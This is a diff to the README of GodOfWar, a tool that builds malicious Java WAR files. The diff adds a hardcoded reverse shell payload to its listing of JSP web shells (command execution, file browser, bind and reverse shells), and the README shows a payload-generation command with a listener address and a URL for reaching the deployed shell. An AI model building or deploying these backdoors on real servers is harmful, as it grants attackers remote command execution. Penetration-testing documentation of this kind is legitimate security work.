@@ -49,6 +49,7 @@ GodOfWar - Malicious Java WAR builder.
     - cmd_get
     - filebrowser
     - bind_shell
+    - reverse_shell
     - reverse_shell_ui 
 - Configurable backdoor. (try `--host/-port`)
 - Control over payload name. 
@@ -89,7 +90,7 @@ $ godofwar -l
 │       ├── Settings:    {"false"=>"No Settings required!"}
 │       ├── Usage:       http://host/cmd.jsp?cmd=whoami
 │       ├── References:  ["https://github.com/danielmiessler/SecLists/tree/master/Payloads/laudanum-0.8/jsp"]
-│       └── Local Path:  /FULL/PATH/HERE/godofwar/payloads/cmd_get
+│       └── Local Path:  /var/lib/gems/2.5.0/gems/godofwar-1.0.1/payloads/cmd_get
 ├── filebrowser
 │   └── Information:
 │       ├── Description: Remote file browser, upload, download, unzip files and native command execution
@@ -97,7 +98,7 @@ $ godofwar -l
 │       ├── Settings:    {"false"=>"No Settings required!"}
 │       ├── Usage:       http://host/filebrowser.jsp
 │       ├── References:  ["http://www.vonloesch.de/filebrowser.html"]
-│       └── Local Path:  /FULL/PATH/HERE/godofwar/payloads/filebrowser
+│       └── Local Path:  /var/lib/gems/2.5.0/gems/godofwar-1.0.1/payloads/filebrowser
 ├── bind_shell
 │   └── Information:
 │       ├── Description: TCP bind shell
@@ -105,21 +106,30 @@ $ godofwar -l
 │       ├── Settings:    {"port"=>4444, "false"=>"No Settings required!"}
 │       ├── Usage:       http://host/reverse-shell.jsp
 │       ├── References:  ["Metasploit - msfvenom -p java/jsp_shell_bind_tcp"]
-│       └── Local Path:  /FULL/PATH/HERE/godofwar/payloads/bind_shell
+│       └── Local Path:  /var/lib/gems/2.5.0/gems/godofwar-1.0.1/payloads/bind_shell
 ├── reverse_shell_ui
 │   └── Information:
-│       ├── Description: TCP reverse shell with a UI to set LHOST and LPORT from browser.
-│       ├── OS:          windows
+│       ├── Description: TCP reverse shell with a HTML form to set LHOST and LPORT from browser.
+│       ├── OS:          any
 │       ├── Settings:    {"host"=>"attacker", "port"=>4444, "false"=>"No Settings required!"}
 │       ├── Usage:       http://host/reverse_shell_ui.jsp
 │       ├── References:  []
-│       └── Local Path:  /FULL/PATH/HERE/godofwar/payloads/reverse_shell_ui
+│       └── Local Path:  /var/lib/gems/2.5.0/gems/godofwar-1.0.1/payloads/reverse_shell_ui
+├── reverse_shell
+│   └── Information:
+│       ├── Description: TCP reverse shell. LHOST and LPORT are hardcoded
+│       ├── OS:          any
+│       ├── Settings:    {"host"=>"attacker", "port"=>4444, "false"=>"No Settings required!"}
+│       ├── Usage:       http://host/reverse_shell.jsp
+│       ├── References:  []
+│       └── Local Path:  /var/lib/gems/2.5.0/gems/godofwar-1.0.1/payloads/reverse_shell
 ```
 
 **Generate payload with LHOST and LPORT**
 ```
 godofwar -p reverse_shell_ui -H 192.168.100.10  -P 9911 -o puppy
 ```
+After deployment, you can visit your shell on (http://host:8080/puppy/puppy.jsp) 
 
 ## Contributing
 
